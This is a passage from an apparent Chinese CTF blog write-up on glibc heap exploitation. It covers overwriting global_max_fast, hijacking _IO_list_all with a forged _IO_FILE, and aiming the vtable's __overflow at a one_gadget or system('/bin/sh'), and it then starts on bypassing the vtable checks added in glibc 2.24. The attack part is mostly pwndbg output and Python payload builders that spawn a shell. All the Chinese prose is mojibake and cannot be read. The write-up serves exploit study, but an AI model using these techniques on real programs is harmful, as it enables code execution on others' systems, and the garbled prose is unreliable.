href="#è°ƒè¯•">Â¶</a>è°ƒè¯•</h5><p><strong>é¦–å…ˆçœ‹çœ‹ global_max_fast è¿™éƒ¨åˆ†ã€‚</strong></p><p>åœ¨æˆ‘ä»¬å†™ <code>admin</code> ä¹‹å‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/10xg &amp;global_max_fast<br><span class="hljs-number">0x7f6a347977f8</span> &lt;global_max_fast&gt;:       <span class="hljs-number">0x0000000000000080</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797808</span> &lt;root&gt;:  <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797818</span> &lt;old_realloc_hook&gt;:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797828</span> &lt;old_malloc_hook&gt;:       <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797838</span> &lt;added_atexit_handler&gt;:  <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>å†™ <code>admin</code> ä¹‹åï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/10xg &amp;global_max_fast<br><span class="hljs-number">0x7f6a347977f8</span> &lt;global_max_fast&gt;:       <span class="hljs-number">0x0000006e696d6461</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797808</span> &lt;root&gt;:  <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797818</span> &lt;old_realloc_hook&gt;:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797828</span> &lt;old_malloc_hook&gt;:       <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797838</span> &lt;added_atexit_handler&gt;:  <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/s <span class="hljs-number">0x7f6a347977f8</span><br><span class="hljs-number">0x7f6a347977f8</span> &lt;global_max_fast&gt;:       <span class="hljs-string">&quot;admin&quot;</span><br></code></pre></td></tr></table></figure><p>é‡Šæ”¾å¤§å †å—å‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; parseheap<br>addr                prev                size                 status              fd                bk    <br><span class="hljs-number">0x8b9000</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x420</span>                Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br><span class="hljs-number">0x8b9420</span>            <span class="hljs-number">0x420</span>               <span class="hljs-number">0x1410</span>               Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br>pwndbg&gt; x/xg &amp;_IO_list_all<br><span class="hljs-number">0x7f6a34796520</span> &lt;_IO_list_all&gt;:  <span class="hljs-number">0x00007f6a34796540</span><br>pwndbg&gt; x/xg <span class="hljs-number">0x00007f6a34796540</span><br><span class="hljs-number">0x7f6a34796540</span> &lt;_IO_2_1_stderr_&gt;:       <span class="hljs-number">0x00000000fbad2086</span><br></code></pre></td></tr></table></figure><p>é‡Šæ”¾å¤§å †å—åï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; parseheap<br>addr                prev                size                 status              fd                bk    <br><span class="hljs-number">0x8b9000</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x420</span>                Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br><span class="hljs-number">0x8b9420</span>            <span class="hljs-number">0x420</span>               <span class="hljs-number">0x1410</span>               Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br>pwndbg&gt; x/xg &amp;_IO_list_all<br><span class="hljs-number">0x7f6a34796520</span> &lt;_IO_list_all&gt;:  <span class="hljs-number">0x00000000008b9420</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ _IO_list_all æˆåŠŸçš„è¢«æˆ‘ä»¬å †åœ°å€å–ä»£äº†ã€‚ä»è€Œæˆ‘ä»¬æ§åˆ¶äº†éå† IO ç»“æ„ä½“æ—¶çš„æ•´ä¸ªæµç¨‹ã€‚</p><p>å…¶ä¸­åç§»è®¡ç®—ï¼ˆè¿™é‡Œæˆ‘é‡æ–°è¿è¡Œäº†æ‰€ä»¥å’Œä¸Šé¢åœ°å€ä¸åŒä½†æ€è·¯ä¸å½±å“ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p &amp;main_arena.fastbinsY<br>$<span class="hljs-number">5</span> = (mfastbinptr (*)[<span class="hljs-number">10</span>]) <span class="hljs-number">0x7f8a7d7b0b28</span> &lt;main_arena+<span class="hljs-number">8</span>&gt;<br>pwndbg&gt; p &amp;_IO_list_all<br>$<span class="hljs-number">6</span> = (struct _IO_FILE_plus **) <span class="hljs-number">0x7f8a7d7b1520</span> &lt;_IO_list_all&gt;<br>pwndbg&gt; p/x <span class="hljs-number">0x7f8a7d7b1520</span>-<span class="hljs-number">0x7f8a7d7b0b28</span><br>$<span class="hljs-number">7</span> = <span class="hljs-number">0x9f8</span><br>pwndbg&gt; p/x <span class="hljs-number">2</span>*<span class="hljs-number">0x9f8</span>+<span class="hljs-number">0x10</span><br>$<span class="hljs-number">8</span> = <span class="hljs-number">0x1400</span><br></code></pre></td></tr></table></figure><p><strong>å†ç”¨ <code>fp</code> çœ‹çœ‹æˆ‘ä»¬ä¼ªé€ çš„ IO ç»“æ„ä½“ã€‚</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; parseheap<br>addr                prev                size                 status              fd                bk    <br><span class="hljs-number">0x8b9000</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x420</span>                Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br><span class="hljs-number">0x8b9420</span>            <span class="hljs-number">0x420</span>               <span class="hljs-number">0x1410</span>               Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br>pwndbg&gt; fp <span class="hljs-number">0x8b9420</span><br>$<span class="hljs-number">1</span> = &#123;<br>  file = &#123;<br>    _flags = <span class="hljs-number">1056</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x1411</span> &lt;error: Cannot access memory at address <span class="hljs-number">0x1411</span>&gt;,<br>    _IO_read_end = <span class="hljs-number">0x7f6a34796540</span> &lt;_IO_2_1_stderr_&gt; <span class="hljs-string">&quot;\206 \255&quot;</span>, &lt;incomplete sequence \<span class="hljs-number">373</span>&gt;,<br>    _IO_read_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x1</span> &lt;error: Cannot access memory at address <span class="hljs-number">0x1</span>&gt;,<br>    _IO_write_end = <span class="hljs-number">0x0</span>,<br>    _IO_buf_base = <span class="hljs-number">0x0</span>,<br>    _IO_buf_end = <span class="hljs-number">0x0</span>,<br>    _IO_save_base = <span class="hljs-number">0x0</span>,<br>    _IO_backup_base = <span class="hljs-number">0x0</span>,<br>    _IO_save_end = <span class="hljs-number">0x0</span>,<br>    _markers = <span class="hljs-number">0x0</span>,<br>    _chain = <span class="hljs-number">0x0</span>,<br>    _fileno = <span class="hljs-number">0</span>,<br>    _flags2 = <span class="hljs-number">0</span>,<br>    _old_offset = <span class="hljs-number">0</span>,<br>    _cur_column = <span class="hljs-number">0</span>,<br>    _vtable_offset = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>    _shortbuf = <span class="hljs-string">&quot;&quot;</span>,<br>    _lock = <span class="hljs-number">0x0</span>,<br>    _offset = <span class="hljs-number">0</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x0</span>,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0</span>,<br>    _mode = -<span class="hljs-number">1</span>,<br>    _unused2 = <span class="hljs-string">&quot;\377\377\377\377&quot;</span>, <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats <span class="hljs-number">15</span> times&gt;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x602098</span> &lt;completed&gt;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„é‡ç‚¹æ˜¯æˆ‘ä»¬åŠ«æŒçš„ vtableï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p *(const struct _IO_jump_t *)<span class="hljs-number">0x602098</span><br>$<span class="hljs-number">4</span> = &#123;<br>  __dummy = <span class="hljs-number">0</span>,<br>  __dummy2 = <span class="hljs-number">0</span>,<br>  __finish = <span class="hljs-number">0x0</span>,<br>  __overflow = <span class="hljs-number">0x7f6a344c2247</span> &lt;exec_comm+<span class="hljs-number">2263</span>&gt;,<br>  __underflow = <span class="hljs-number">0x0</span>,<br>  __uflow = <span class="hljs-number">0x0</span>,<br>  __pbackfail = <span class="hljs-number">0x0</span>,<br>  __xsputn = <span class="hljs-number">0x0</span>,<br>  __xsgetn = <span class="hljs-number">0x0</span>,<br>  __seekoff = <span class="hljs-number">0x8b9010</span>,<br>  __seekpos = <span class="hljs-number">0x0</span>,<br>  __setbuf = <span class="hljs-number">0x0</span>,<br>  __sync = <span class="hljs-number">0x0</span>,<br>  __doallocate = <span class="hljs-number">0x0</span>,<br>  __read = <span class="hljs-number">0x0</span>,<br>  __write = <span class="hljs-number">0x0</span>,<br>  __seek = <span class="hljs-number">0x0</span>,<br>  __close = <span class="hljs-number">0x0</span>,<br>  __stat = <span class="hljs-number">0x0</span>,<br>  __showmanyc = <span class="hljs-number">0x0</span>,<br>  __imbue = <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° <code>__overflow</code> ä½ç½®å·²ç»è¢«å†™ä¸Šäº†æˆ‘ä»¬çš„ onegadget ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525000410526.png" alt="image-20220525000410526"></p><p>æ»¡è¶³è¿›å…¥æ¡ä»¶åï¼Œåœ¨ <code>_IO_cleanup</code> çš„ <code>_IO_flush_all_lockp</code> å‡½æ•°é‡Œé¢ä¼šè°ƒç”¨ç»“æ„ä½“ vtable çš„ <code>_IO_OVERFLOW</code> å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æå‰æ›¿ä»£å¥½çš„ <code>one_gadget</code> ã€‚</p><p><strong>è¿›å…¥ _IO_OVERFLOW æ¡ä»¶ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-number">779</span>       <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>  <span class="hljs-number">780</span> <span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-number">781</span>     || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>  <span class="hljs-number">782</span>         &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>  <span class="hljs-number">783</span>                              &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>  <span class="hljs-number">784</span> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-number">785</span>     )<br>â–º <span class="hljs-number">786</span>    &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br></code></pre></td></tr></table></figure><p>åˆ«çœ‹è¿™éƒ½æ˜¯ if åˆ¤æ–­è¯­å¥ï¼Œè¿™ç©æ„éµå¾ªä¸€ä¸ª<strong>çŸ­è·¯åŸåˆ™</strong>ï¼Œå°±æ˜¯å¦‚æœå·²ç»æœ‰æ¡ä»¶å¯ä»¥åˆ¤æ–­å‡º if ä¸ºå‡ï¼Œå°±ä¸ä¼šå»æ‰§è¡Œå‰©ä¸‹çš„åˆ¤æ–­è¯­å¥ã€‚æ‰€ä»¥æˆ‘ä»¬è¦æˆåŠŸçš„è°ƒç”¨ <code>_IO_OVERFLOW</code> ï¼Œå°±è¦ä¿è¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><p>å¦‚æœä½ æƒ³ä¸å¼€å»ä¿è¯å¦å¤–ä¸€å †æ¡ä»¶å½“ç„¶ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p><p>è°ƒè¯•éƒ¨åˆ†åˆ°æ­¤å°±ç»“æŸäº†ã€‚</p><p>æ­¤å¤–ï¼Œç¨å¾®æä¸€å¥å°±æ˜¯è¿™é¢˜æˆ‘ä»¬å¦‚æœåœ¨ bss æ®µå†™çš„æ˜¯ system çš„è¯ï¼Œç»“æ„ä½“ä¹Ÿå¯ä»¥è¿™æ ·æ„é€ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_IO = <span class="hljs-string">&#x27;/bin/sh\0&#x27;</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<br>fake_IO = fake_IO.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_IO += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>fake_IO += p64(<span class="hljs-number">0x6020B0</span> - <span class="hljs-number">0x18</span>)<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525001739503.png" alt="image-20220525001739503"></p><p>è¿™æ—¶å€™çš„ <strong>_IO_OVERFLOW</strong> å°±ç­‰åŒäº <code>system('/bin/sh\0');</code> èƒ½ç¨³å®š getshellã€‚</p><h5 id="æ³¨æ„"><a class="header-anchor" href="#æ³¨æ„">Â¶</a>æ³¨æ„</h5><p>æ³¨æ„çš„ç‚¹å°±æ˜¯ï¼Œæˆ‘ä»¬ _IO_list_all å†™çš„æ˜¯å †åœ°å€ï¼Œ<strong>æˆ‘ä»¬çš„ _flags å’Œ _IO_read_ptr æ˜¯è¢« prev_size å’Œ size å æ®</strong>çš„ã€‚è¿™å°±æ˜¯ä¸ºæ¯›æˆ‘ä»¬å†™çš„å†…å®¹æ˜¯ <code>fake_IO[0x10:]</code> ã€‚</p><p>æ‰€ä»¥æƒ³è¦ç¬¬äºŒç§æ–¹æ³• getshell çš„è¯è¦è®°å¾—æ›´æ”¹ä¸Šä¸ª chunk åœ¨ prev_size ä½çš„æ•°æ®ã€‚æœ€åæ­£å¸¸ getshell ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525122757746.png" alt="image-20220525122757746"></p><h3 id="åŸºæœ¬æ„é€ "><a class="header-anchor" href="#åŸºæœ¬æ„é€ ">Â¶</a>åŸºæœ¬æ„é€ </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">FILE</span>(<span class="hljs-params">vtable_addr</span>):<br>    fake_IO = <span class="hljs-string">&#x27;/bin/sh\0&#x27;</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>    fake_IO += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br>    fake_IO = fake_IO.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>    fake_IO += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> <span class="hljs-comment"># _mode &lt;= 0</span><br>    fake_IO += p64(vtable_addr - <span class="hljs-number">0x18</span>)<br>    <span class="hljs-keyword">return</span> fake_IO<br></code></pre></td></tr></table></figure><hr><h2 id="2-24-Libc-2-27-3ubuntu1-2"><a class="header-anchor" href="#2-24-Libc-2-27-3ubuntu1-2">Â¶</a>2.24 =&lt; Libc &lt;= 2.27-3ubuntu1.2</h2><p>ä¸ºæ¯›æ˜¯ 2.27-3ubuntu1.2 æ˜¯å› ä¸ºä¸‹é¢è¿™ä¿© ğŸ‘´ åœ¨ 2.27-3ubuntu1.4 è¯•è¿‡äº†ä¸è¡Œã€‚</p><h3 id="vtable-æ£€æµ‹ç»•è¿‡"><a class="header-anchor" href="#vtable-æ£€æµ‹ç»•è¿‡">Â¶</a>vtable æ£€æµ‹ç»•è¿‡</h3><h4 id="æ²¡å•¥å¿…è¦çœ‹çš„æ£€æŸ¥ä»£ç "><a class="header-anchor" href="#æ²¡å•¥å¿…è¦çœ‹çš„æ£€æŸ¥ä»£ç ">Â¶</a>æ²¡å•¥å¿…è¦çœ‹çš„æ£€æŸ¥ä»£ç </h4><p>Libc 2.24 å¾€ä¸Šèµ°å°±æœ‰äº†å¯¹ vtable çš„æ£€æŸ¥ã€‚ä½†åŸºæœ¬æ€è·¯è¿˜æ˜¯æ²¡æœ‰å˜ï¼ŒåŠ«æŒå‡½æ•°æŒ‡é’ˆï¼Œåªè¦æŒæ¡ç»•è¿‡æ€è·¯æœ¬è´¨è¿˜æ˜¯ä¸€æ ·çš„ã€‚</p><p>åœ¨ 2.24 ç‰ˆæœ¬çš„ glibc ä¸­ï¼Œå…¨æ–°åŠ å…¥äº†é’ˆå¯¹ IO_FILE_plus çš„ vtable åŠ«æŒçš„æ£€æµ‹æªæ–½ï¼Œglibc ä¼šåœ¨è°ƒç”¨è™šå‡½æ•°ä¹‹å‰é¦–å…ˆæ£€æŸ¥ vtable åœ°å€çš„åˆæ³•æ€§ã€‚</p><p>é¦–å…ˆä¼šéªŒè¯ vtable æ˜¯å¦ä½äº <strong>_IO_vtable</strong> æ®µï¼ˆæ®µå†…ä¸€å®šåç§»èŒƒå›´è¿˜æ˜¯æ¯”è¾ƒå®½æ¾çš„ï¼‰ä¸­ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶å°±æ­£å¸¸æ‰§è¡Œï¼Œå¦åˆ™ä¼šè°ƒç”¨ *** _IO_vtable_check*** åšè¿›ä¸€æ­¥åˆæ³•æ€§æ£€æŸ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> _IO_vtable_check (<span class="hljs-type">void</span>) attribute_hidden;<br><br><span class="hljs-comment">/* Perform vtable pointer validation.  If validation fails, terminate</span><br><span class="hljs-comment">   the process.  */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span><br><span class="hljs-comment">     section.  */</span><br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ptr = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="hljs-comment">//offset å¤§äº section_length , è°ƒç”¨æ£€æŸ¥å‡½æ•°</span><br>    <span class="hljs-comment">/* The vtable pointer is not in the expected section.  Use the</span><br><span class="hljs-comment">       slow path, which will terminate the process if necessary.  */</span><br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> attribute_hidden<br>_IO_vtable_check (<span class="hljs-type">void</span>)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  <span class="hljs-comment">/* Honor the compatibility flag.  */</span><br>  <span class="hljs-type">void</span> (*flag) (<span class="hljs-type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (flag);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (flag == &amp;_IO_vtable_check)<span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦æ˜¯å¤–éƒ¨é‡æ„çš„vtable</span><br>    <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-comment">/* In case this libc copy is in a non-default namespace, we always</span><br><span class="hljs-comment">     need to accept foreign vtables because there is always a</span><br><span class="hljs-comment">     possibility that FILE * objects are passed across the linking</span><br><span class="hljs-comment">     boundary.  */</span><br>  &#123;<br>    Dl_info di;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>    <span class="hljs-keyword">if</span> (_dl_open_hook != <span class="hljs-literal">NULL</span><br>        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span><br>            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))<span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦æ˜¯åŠ¨æ€é“¾æ¥åº“ä¸­çš„vtable</span><br>      <span class="hljs-keyword">return</span>;<br>  &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span> <span class="hljs-comment">/* !SHARED */</span></span><br>  <span class="hljs-comment">/* We cannot perform vtable validation in the static dlopen case</span><br><span class="hljs-comment">     because FILE * handles might be passed back and forth across the</span><br><span class="hljs-comment">     boundary.  Therefore, we disable checking in this case.  */</span><br>  <span class="hljs-keyword">if</span> (__dlopen != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  __libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¸Šé¢è¿™äº›æ²¡æœ‰ç”¨</strong>ï¼Œä¸»è¦çœ¼ç†Ÿä¸€ä¸‹è¿™ä¸ªï¼Œä¸€èˆ¬è¿™ä¸ªå‡ºæ¥äº†è¯´æ˜ä½ çš„ vtable æ²¡ ğŸ‘ å¥½ï¼Œè°ƒè¯•çœ‹çœ‹è‡ªå·±çš„æ•°æ®æœ‰æ²¡æœ‰æ„é€ é”™ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="ç»å…¸ä¿©å¤§åŸºæœ¬ç»•è¿‡æ€è·¯"><a class="header-anchor" href="#ç»å…¸ä¿©å¤§åŸºæœ¬ç»•è¿‡æ€è·¯">Â¶</a>ç»å…¸ä¿©å¤§åŸºæœ¬ç»•è¿‡æ€è·¯</h4><p>å› ä¸ºåŠ å…¥äº†å¯¹ vtable ä½ç½®çš„æ£€æŸ¥ï¼Œæˆ‘ä»¬çå‡ æŠŠåŠ«æŒ vtable çš„è€ä¸€å¥—å·²ç»æ²¡ç”¨äº†ï¼Œä½†æ˜¯åŸºæœ¬åˆ©ç”¨æ€è·¯è¿˜æ˜¯ç›¯ç€è¿™ä¸ª <code>_IO_OVERFLOW</code> ã€‚</p><p>ä¸èƒ½å†™è‡ªå·±çš„ vtable ï¼Œé‚£å°±æ‰¾åŸæœ¬ç¨‹åºä¸­å°±å­˜åœ¨çš„ vtableï¼Œåˆ©ç”¨å…¶ä¸­çš„å‡½æ•°æŒ‡é’ˆã€‚</p><p>ç›®å‰ä¸»æµæ€è·¯å°±æ˜¯åˆ©ç”¨ <code>_IO_str_jumps</code> æˆ– <code>_IO_wstr_jumps</code> ä¸­çš„ <code>_IO_str_overflow()</code> å’Œ <code>_IO_str_finish()</code> å‡½æ•°ã€‚</p><p>æ„æ€å°±æ˜¯åœ¨ vtable ä¸Šå†™ä¸Š <code>_IO_str_jumps</code>  <strong>åŠ å‡ä¸€æ®µåç§»</strong>æ¥ä½¿å¾— IO ç»“æ„ä½“åœ¨ <code>_IO_OVERFLOW</code> <strong>æŸ¥ vtable è¡¨æ—¶</strong>è°ƒç”¨ <code>_IO_str_finish</code> æˆ– <code>_IO_str_overflow</code> 